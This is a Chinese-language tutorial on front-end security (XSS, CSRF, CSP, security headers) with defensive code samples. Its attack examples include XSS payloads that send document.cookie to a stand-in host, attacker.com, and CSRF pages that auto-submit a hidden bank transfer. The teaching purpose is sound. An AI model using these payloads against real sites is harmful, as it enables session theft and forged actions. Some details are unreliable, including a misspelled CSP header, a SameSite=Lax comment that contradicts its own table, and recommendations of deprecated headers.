# 前端安全策略完整指南

## 概述

前端安全是 Web 应用安全的第一道防线。本文档系统整理 XSS、CSRF、CSP 等常见前端安全问题的原理和防护策略，帮助开发者构建更安全的 Web 应用。

## 目录

- [XSS（跨站脚本攻击）](#xss跨站脚本攻击)
- [CSRF（跨站请求伪造）](#csrf跨站请求伪造)
- [CSP（内容安全策略）](#csp内容安全策略)
- [其他安全措施](#其他安全措施)
- [安全响应头速查表](#安全响应头速查表)

---

## XSS（跨站脚本攻击）

### 什么是 XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击。攻击者通过在目标网站注入恶意脚本，当用户访问该页面时，恶意脚本会在用户浏览器中执行，从而窃取用户数据、劫持会话或执行恶意操作。

### XSS 三种类型

#### 1. 存储型 XSS（Stored XSS）

**原理**：恶意脚本被永久存储在目标服务器（数据库、评论、用户资料等），所有访问该内容的用户都会被攻击。

**攻击流程**：

```
攻击者提交恶意脚本 → 服务器存储该脚本 → 用户访问页面 → 恶意脚本执行
```

**攻击示例**：

```html
<!-- 攻击者在一篇博客评论区提交： -->
<script>
  // 窃取用户 cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- 或者更隐蔽的方式： -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
<a href="javascript:fetch('https://attacker.com/steal?cookie=' + document.cookie)">点击这里</a>
<div onmouseover="fetch('https://attacker.com/steal?cookie=' + document.cookie)">悬停触发</div>
```

**真实案例场景**：

```javascript
// 假设一个论坛帖子系统，直接将用户输入存入数据库
// 后端代码（不安全）
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.query('INSERT INTO comments (content) VALUES (?)', [comment]);
  // 如果攻击者提交 <script>alert('XSS')</script>，所有查看该评论的用户都会执行脚本
});

// 前端渲染（不安全）
// 假设直接用 innerHTML 渲染用户评论
commentElement.innerHTML = savedComment; // ❌ 危险！
```

**防御方案**：

```javascript
// 方案一：后端转义（最根本）
const escapeHtml = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

// 存储前转义
const safeComment = escapeHtml(req.body.comment);
db.query('INSERT INTO comments (content) VALUES (?)', [safeComment]);

// 方案二：前端使用 textContent 而非 innerHTML
commentElement.textContent = savedComment; // ✅ 安全

// 方案三：使用 DOMPurify 等专业库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
commentElement.innerHTML = clean; // ✅ 安全
```

---

#### 2. 反射型 XSS（Reflected XSS）

**原理**：恶意脚本作为用户请求的一部分，被服务器接收后未做转义直接包含在响应中，浏览器执行响应时触发脚本。

**攻击流程**：

```
攻击者构造恶意链接（含脚本） → 用户点击链接 → 请求发送到服务器 
→ 服务器反射恶意脚本在响应中 → 用户浏览器执行恶意脚本
```

**攻击示例**：

```html
<!-- URL 中的恶意脚本 -->
https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- 服务器后端（不安全） -->
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 直接将用户输入插入 HTML 响应
  res.send(`<h1>搜索结果: ${query}</h1>`); // ❌ 危险！
});

// 或者更隐蔽的链接
https://site.com/error?msg=<img src=x onerror="alert('XSS')">
```

**防御方案**：

```javascript
// 方案一：后端对所有输入进行转义
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q || '');
  res.send(`<h1>搜索结果: ${query}</h1>`); // ✅ 安全
});

// 方案二：前端接收数据时转义
const params = new URLSearchParams(window.location.search);
const query = escapeHtml(params.get('q') || '');
document.querySelector('.results').textContent = query; // ✅ 安全

// 方案三：使用模板引擎的自动转义（如 EJS）
// <%= query %> 自动转义
```

---

#### 3. DOM 型 XSS（DOM-based XSS）

**原理**：恶意脚本完全在客户端执行，通过操作 DOM 引入恶意内容，不经过服务器。

**攻击流程**：

```
用户访问包含恶意脚本的页面 → 页面 JavaScript 操作 DOM 
→ 从 URL、localStorage 或其他来源获取数据 
→ 直接将恶意内容插入 DOM → 恶意脚本执行
```

**攻击示例**：

```html
<!-- 恶意页面 URL -->
https://example.com/page?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- 前端代码（不安全） -->
<script>
  // 从 URL 获取参数直接写入页面
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name');
  
  // ❌ 危险！innerHTML 会执行嵌入的脚本
  document.getElementById('welcome').innerHTML = '欢迎 ' + name;
  
  // ❌ 危险！location.hash 也可能被利用
  document.getElementById('comment').innerHTML = location.hash;
  
  // ✅ 安全但复杂
  const safeName = document.createTextNode(name);
  document.getElementById('welcome').appendChild(safeName);
</script>

<div id="welcome"></div>
```

**更隐蔽的 DOM XSS**：

```html
<!-- 使用 data: URL -->
<a href="javascript:alert('XSS')">点击我</a>

<!-- 使用 SVG onload -->
<svg onload="alert('XSS')"></svg>

<!-- 使用 CSS -->
<div style="background: url('javascript:alert(1)')">样式注入</div>
```

**防御方案**：

```javascript
// 方案一：避免使用 innerHTML，改用更安全的 API
const params = new URLSearchParams(window.location.search);
const name = params.get('name') || '';

// ✅ 使用 textContent
document.getElementById('welcome').textContent = '欢迎 ' + name;

// ✅ 使用 setAttribute 安全的场景
const link = document.createElement('a');
link.setAttribute('href', safeUrl);
link.textContent = '链接';

// 方案二：使用 DOMPurify 清理输入
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// 方案三：验证并清理 URL
const validateUrl = (url) => {
  try {
    const parsed = new URL(url);
    // 只允许 http/https 协议
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return '#';
    }
    return url;
  } catch {
    return '#';
  }
};

// 方案四：使用 Content-Security-Policy
// <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

---

### XSS 防御最佳实践

#### 1. 输入过滤与验证

```javascript
// 输入白名单验证
const validateInput = (input) => {
  // 只允许字母、数字和部分符号
  const pattern = /^[a-zA-Z0-9\s.,!?]+$/;
  return pattern.test(input);
};

// 输入长度限制
const sanitizeLength = (str, maxLength = 255) => {
  return String(str).substring(0, maxLength);
};

// HTML 标签白名单
const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br'];
const ALLOWED_ATTRS = ['href'];

const sanitizeHtml = (html) => {
  // 使用 DOMParser 解析
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  
  // 遍历所有元素，移除不允许的标签和属性
  const walker = document.createTreeWalker(
    doc.body,
    NodeFilter.SHOW_ELEMENT
  );
  
  const nodesToRemove = [];
  while (walker.nextNode()) {
    const node = walker.currentNode;
    if (!ALLOWED_TAGS.includes(node.tagName.toLowerCase())) {
      nodesToRemove.push(node);
    } else {
      // 移除不允许的属性
      Array.from(node.attributes).forEach(attr => {
        if (!ALLOWED_ATTRS.includes(attr.name)) {
          node.removeAttribute(attr.name);
        }
      });
    }
  }
  
  nodesToRemove.forEach(n => n.remove());
  return doc.body.innerHTML;
};
```

#### 2. 输出编码

```javascript
// 根据输出位置使用不同的编码方式
const htmlEncode = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

const attrEncode = (str) => {
  return htmlEncode(str).replace(/\s/g, '&#x20;');
};

const jsEncode = (str) => {
  return JSON.stringify(str).slice(1, -1); // 移除引号
};

const urlEncode = (str) => {
  return encodeURIComponent(str);
};

// 使用示例
element.textContent = htmlEncode(userData);           // 元素内容
element.setAttribute('data-name', attrEncode(userData)); // 属性值
element.onclick = `handleClick('${jsEncode(userData)}')`; // JavaScript 字符串
```

#### 3. HTTP 响应头防护

```javascript
// 后端设置安全响应头
app.use((req, res, next) => {
  // 防止 XSS（针对老浏览器）
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // 内容类型 sniffing 防护
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // CSP（最强大）
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  
  next();
});
```

---

## CSRF（跨站请求伪造）

### 什么是 CSRF

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种依赖用户已登录的身份，诱导用户向目标网站发起恶意请求的攻击。攻击者无法直接获取用户数据，但可以利用用户的登录状态执行未授权的操作。

### CSRF 原理

**攻击流程**：

```
1. 用户登录目标网站 A，获取有效 session/cookie
2. 用户被诱导访问恶意网站 B
3. 网站 B 中包含向网站 A 发起请求的代码（自动或点击触发）
4. 浏览器自动携带网站 A 的 cookie 发送请求
5. 网站 A 验证 cookie 有效，执行恶意操作
```

**关键点**：浏览器会自动携带同源 cookie，但不会携带其他域的 cookie（这是 CSRF 与 XSS 的本质区别）。

### 攻击示例

#### 1. 自动 POST 表单提交

```html
<!-- 恶意网站 B 的页面 -->
<html>
<body>
  <h1>恭喜获得一等奖！</h1>
  <!-- 隐藏表单，自动提交 -->
  <form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
  </form>
  <script>
    document.getElementById('csrf-form').submit(); // 自动提交
  </script>
</body>
</html>
```

#### 2. 图片/脚本跨域请求

```html
<!-- 使用 img 标签（只能发 GET） -->
<img src="https://mail.com/delete?folder=inbox" width="0" height="0">

<!-- 使用 script 标签 -->
<script src="https://api.example.com/logout"></script>

<!-- 使用 link 样式表 -->
<link rel="stylesheet" href="https://example.com/change-theme?color=red">

<!-- 使用 iframe -->
<iframe src="https://example.com/admin/delete?id=123" style="display:none"></iframe>
```

#### 3. XMLHttpRequest/Fetch 攻击

```html
<script>
  fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include', // 携带 cookie
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ to: 'attacker', amount: 10000 })
  });
</script>
```

### CSRF 防御方案

#### 1. CSRF Token（最常用）

**原理**：服务器为每个用户会话生成唯一的随机 token，表单提交和请求必须携带有效 token。

```javascript
// 后端：生成并验证 CSRF Token

// 生成 token（存入 session）
const generateCsrfToken = () => {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  return token;
};

// 验证 token
const validateCsrfToken = (req, res, next) => {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (token && token === req.session.csrfToken) {
    next();
  } else {
    res.status(403).json({ error: 'Invalid CSRF token' });
  }
};

// Express 中间件使用
app.post('/api/transfer', validateCsrfToken, (req, res) => {
  // 处理转账逻辑
});

// 前端：表单中包含 token
// <form method="POST" action="/transfer">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   ...
// </form>

// 前端：AJAX 请求携带 token
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken // 或 'X-CSRF-Token'
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});
```

#### 2. SameSite Cookie

**原理**：通过设置 Cookie 的 SameSite 属性，阻止浏览器在跨站请求中发送该 cookie。

```javascript
// 后端设置 SameSite Cookie
res.cookie('session_id', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 或 'lax'
});

// SameSite 三种模式：
// - Strict：完全禁止跨站发送cookie，只有同站请求才携带
// - Lax：大部分跨站GET请求不携带，但POST、img等GET请求会携带
// - None：关闭限制，但必须配合 Secure（https）
```

**SameSite 效果对比**：

| 场景 | SameSite=Strict | SameSite=Lax | SameSite=None |
|------|----------------|-------------|---------------|
| 同站请求 | ✅ 携带 | ✅ 携带 | ✅ 携带 |
| 跨站 GET（链接） | ❌ 不携带 | ✅ 携带 | ✅ 携带 |
| 跨站 POST | ❌ 不携带 | ❌ 不携带 | ✅ 携带 |
| 跨站 img/script | ❌ 不携带 | ❌ 不携带 | ✅ 携带 |

**最佳实践**：

```javascript
// 同时设置多个安全属性
res.cookie('session', sessionId, {
  httpOnly: true,   // 禁止 JavaScript 访问（防 XSS）
  secure: true,     // 仅 HTTPS（防止中间人）
  sameSite: 'strict', // CSRF 防护
  path: '/',        // Cookie 路径
  maxAge: 3600000   // 1小时过期
});
```

#### 3. 验证请求来源（Origin/Referer）

```javascript
// 后端验证请求来源
const validateOrigin = (req, res, next) => {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const allowedOrigins = ['https://example.com', 'https://app.example.com'];
  
  if (allowedOrigins.includes(origin) || allowedOrigins.includes(referer)) {
    next();
  } else {
    res.status(403).json({ error: 'Invalid origin' });
  }
};

// Express 使用
app.post('/api/transfer', validateOrigin, (req, res) => {
  // 处理逻辑
});
```

#### 4. 双重提交 Cookie

```javascript
// 不依赖 session 的 CSRF 防护
const generateCsrfToken = () => {
  return crypto.randomBytes(32).toString('hex');
};

// 前端：读取 token（如果有的话）
const getCsrfToken = () => {
  return document.cookie
    .split('; ')
    .find(row => row.startsWith('csrf_token='))
    ?.split('=')[1];
};

// 前端：将 token 同时放在 Cookie 和请求头/体中
const token = getCsrfToken();
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json'
  },
  credentials: 'include', // 发送 cookie
  body: JSON.stringify({ to: 'bob', amount: 100, _csrf: token })
});

// 后端：验证两者一致
const validateDoubleSubmit = (req, res, next) => {
  const cookieToken = req.cookies.csrf_token;
  const bodyToken = req.body._csrf || req.headers['x-csrf-token'];
  
  if (cookieToken && bodyToken && cookieToken === bodyToken) {
    next();
  } else {
    res.status(403).json({ error: 'CSRF validation failed' });
  }
};
```

#### 5. 用户交互防护（辅助手段）

```javascript
// 重新认证：敏感操作要求输入密码
app.post('/transfer', requirePassword, (req, res) => {
  // 转账逻辑
});

const requirePassword = (req, res, next) => {
  const password = req.body.password;
  if (verifyPassword(req.session.userId, password)) {
    next();
  } else {
    res.status(401).json({ error: '密码验证失败' });
  }
};

// 操作确认：显示确认对话框
// 前端
const confirmed = confirm('确定要转账 10000 元到 xxx 吗？');
if (!confirmed) return;
```

---

## CSP（内容安全策略）

### 什么是 CSP

CSP（Content Security Policy，内容安全策略）是一种通过 HTTP 响应头或 `<meta>` 标签控制的浏览器安全机制。CSP 可以明确指定页面允许加载哪些资源（脚本、样式、图片等），有效防止 XSS、数据注入等攻击。

### CSP 指令速查

| 指令 | 说明 | 示例 |
|------|------|------|
| `default-src` | 默认资源策略 | `'self'` |
| `script-src` | JavaScript 来源 | `'self' 'unsafe-inline' 'nonce-xxx'` |
| `style-src` | 样式表来源 | `'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `'self' data: https:` |
| `connect-src` | Ajax/Fetch/WebSocket | `'self' https://api.example.com` |
| `font-src` | 字体来源 | `'self' https://fonts.gstatic.com` |
| `frame-src` | iframe 来源 | `'none'` |
| `object-src` | Flash/插件 | `'none'` |
| `media-src` | 音视频来源 | `'self'` |
| `base-uri` | `<base>` 标签限制 | `'self'` |
| `form-action` | 表单提向 | `'self'` |

### CSP 语法

```
Content-Security-Policy: 指令1 来源1 来源2; 指令2 来源3
```

**来源关键字**：

| 关键字 | 说明 |
|--------|------|
| `'self'` | 同源资源 |
| `'none'` | 禁止任何来源 |
| `'unsafe-inline'` | 允许内联脚本/样式（不安全） |
| `'unsafe-eval'` | 允许 eval() 等动态代码执行 |
| `'nonce-xxx'` | 仅允许带特定 nonce 的内联脚本 |
| `'sha256-xxx'` | 仅允许特定哈希的内联脚本 |
| `data:` | 允许 data: URL（谨慎使用） |
| `https:` | 允许所有 HTTPS |
| `*.example.com` | 允许 example.com 的所有子域 |

### CSP 实战配置

#### 1. 基础安全策略

```http
# 最严格的策略
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; frame-ancestors 'none'

# 稍微宽松但仍安全
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

#### 2. 支持 Google Fonts 的策略

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
```

#### 3. 支持 CDN 和第三方脚本

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://cdn.example.com;
  img-src 'self' data: https: blob:;
  connect-src 'self' https://api.example.com wss:// realtime.example.com;
  frame-src https://youtube.com https://player.vimeo.com;
  font-src 'self' https://fonts.gstatic.com;
```

#### 4. 使用 nonce 的内联脚本策略

```javascript
// 后端：生成随机 nonce
const crypto = require('crypto');
const generateNonce = () => crypto.randomBytes(16).toString('base64');

// 每个请求生成新的 nonce
app.use((req, res, next) => {
  res.locals.nonce = generateNonce();
  res.setHeader('Content-Security-Policy', 
    `script-src 'self' 'nonce-${res.locals.nonce}'`);
  next();
});

// 模板中使用 nonce
// <script nonce="<%= nonce %>">
//   console.log('安全执行');
// </script>
```

#### 5. 使用 hash 验证内联脚本

```http
Content-Security-Policy: script-src 'sha256-base64-encoded-script-here'
```

```javascript
// 计算脚本哈希
const crypto = require('crypto');
const script = 'console.log("hello")';
const hash = crypto.createHash('sha256').update(script).digest('base64');
// 设置 CSP
res.setHeader('Content-Security-Policy', `script-src 'self' 'sha256-${hash}'`);
```

### CSP Report 报告

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  report-uri /csp-report;
  report-to csp-endpoint
```

```javascript
// 后端接收 CSP 违规报告
app.post('/csp-report', (req, res) => {
  const report = req.body['csp-report'];
  console.error('CSP Violation:', report);
  // 保存到数据库或发送邮件通知
  logger.warn({
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    originalPolicy: report['original-policy'],
    documentUri: report['document-uri']
  });
  res.status(204).end();
});

// 前端也可以用 Reporting API
```

### CSP 部署检查清单

```http
# 1. 先用 Report-Only 测试（不阻止，只报告）
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline'; report-uri /csp-report

# 2. 确认无误后切换为强制执行
Content-Security-Security-Policy: default-src 'self'; script-src 'self'; ...
```

---

## 其他安全措施

### HTTPS 配置

```http
# 启用 HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 解释：
# max-age: 浏览器缓存该策略的时间（秒）
# includeSubDomains: 包含子域名
# preload: 申请加入浏览器预加载列表
```

### X-Frame-Options

防止页面被嵌入 iframe（点击劫持防护）：

```http
# 完全禁止被嵌入
X-Frame-Options: DENY

# 只允许同源嵌入
X-Frame-Options: SAMEORIGIN

# 允许特定域名嵌入
X-Frame-Options: ALLOW-FROM https://trusted.example.com
```

### X-Content-Type-Options

防止浏览器 MIME 类型 sniffing：

```http
X-Content-Type-Options: nosniff
```

### Referrer-Policy

控制 Referer 头的发送策略：

```http
# 不发送 Referer
Referrer-Policy: no-referrer

# 仅对同源发送
Referrer-Policy: same-origin

# 仅 HTTPS→HTTPS 发送
Referrer-Policy: strict-origin-when-cross-origin

# 推荐：默认安全策略
Referrer-Policy: strict-origin-when-cross-origin
```

### Permissions-Policy

控制页面和 iframe 可以使用的浏览器功能：

```http
Permissions-Policy: 
  geolocation=(),
  microphone=(),
  camera=(),
  payment=(self),
  interest-cohort=()
```

### 敏感数据保护

```javascript
// 敏感数据永远不要存在 localStorage
// localStorage.setItem('token', token); ❌ 危险

// 使用 httpOnly Cookie
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 前端需要 token 时从 Cookie 读取（注意 XSS 可以读取）
const token = document.cookie.split('; ')
  .find(row => row.startsWith('token='))
  ?.split('=')[1];

// 或使用内存变量（页面刷新失效，但更安全）
let token = null;
fetch('/api/token').then(r => r.json()).then(data => {
  token = data.token; // 存在内存中
});
```

---

## 安全响应头速查表

| 响应头 | 推荐值 | 防护目标 | 优先级 |
|--------|--------|---------|--------|
| `Content-Security-Policy` | `default-src 'self'` | XSS、数据注入 | ⭐⭐⭐⭐⭐ |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | 中间人攻击 | ⭐⭐⭐⭐⭐ |
| `X-Frame-Options` | `DENY` 或 `SAMEORIGIN` | 点击劫持 | ⭐⭐⭐⭐ |
| `X-Content-Type-Options` | `nosniff` | MIME  sniffing | ⭐⭐⭐ |
| `X-XSS-Protection` | `1; mode=block` | 老浏览器 XSS | ⭐⭐ |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 隐私泄露 | ⭐⭐⭐ |
| `Permissions-Policy` | 按需配置 | 功能滥用 | ⭐⭐⭐ |
| `Cache-Control` | `no-store, no-cache, must-revalidate` | 敏感数据缓存 | ⭐⭐⭐ |
| `Set-Cookie` | `httpOnly; secure; sameSite=strict` | Cookie 窃取 | ⭐⭐⭐⭐⭐ |

### 完整安全响应头示例

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0
```

### Express.js 安全中间件示例

```javascript
const securityHeaders = (req, res, next) => {
  // CSP
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'");
  
  // HSTS
  res.setHeader('Strict-Transport-Security', 
    'max-age=31536000; includeSubDomains; preload');
  
  // 其他头部
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // 禁用缓存（API 响应）
  if (req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store');
  }
  
  next();
};

app.use(securityHeaders);
```

---

## 前端安全检查清单

### 开发阶段

- [ ] 所有用户输入都经过验证和转义
- [ ] 使用 `textContent` 而非 `innerHTML` 渲染用户数据
- [ ] 使用 CSP 并逐步收紧策略
- [ ] 敏感操作使用 CSRF Token
- [ ] Cookie 设置 `httpOnly`、`secure`、`sameSite`
- [ ] 敏感数据不存储在 localStorage
- [ ] 使用 HTTPS 并配置 HSTS

### 上线前检查

- [ ] 运行 CSP Report-Only 收集违规报告
- [ ] 使用安全扫描工具（如 OWASP ZAP）检测漏洞
- [ ] 审查所有第三方脚本和 CDN
- [ ] 验证所有重定向目标安全性
- [ ] 测试 SameSite Cookie 兼容性

### 运营阶段

- [ ] 监控 CSP 违规报告
- [ ] 定期更新依赖库
- [ ] 关注安全公告（CVE）
- [ ] 建立安全事件响应流程
